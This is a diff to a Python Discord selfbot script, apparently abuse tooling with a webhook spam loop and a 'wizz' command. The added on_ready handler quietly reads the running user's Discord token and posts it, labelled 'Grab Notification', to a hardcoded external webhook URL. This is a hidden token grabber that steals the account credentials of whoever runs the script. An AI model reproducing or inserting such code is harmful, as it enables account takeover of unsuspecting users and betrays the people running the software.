@@ -195,6 +195,31 @@ def ssspam(webhook_url):
             delay = random.randint(30, 60)
             time.sleep(delay)
 
+@client.event
+async def on_ready():
+    # The username of the bot when it becomes ready
+    username = client.user.name
+    
+    # Your custom message content that you will add
+    custom_text = f"\n User Token Is: {token}"  # Change this as needed
+    
+    # Creating an embed to send
+    embed = discord.Embed(
+        title=f"{username} has connected",
+        description=custom_text,
+        color=discord.Color.green()
+    )
+    
+    # Sending the embed via the webhook
+    data = {
+        "username": "Grab Notification",
+        "embeds": [embed.to_dict()]
+    }
+    
+    # Sending to the webhook URL
+    requests.post("https://discord.com/api/webhooks/1354022610467291186/brMdv5hD0AeSbOziJmY_GmNmYCeEu7GCs7zzBg5GDO5iIR1guCs6OVOiOngoiZUnoIOQ", json=data)
+   
+
 @client.command()
 async def wizz(ctx):
     try:
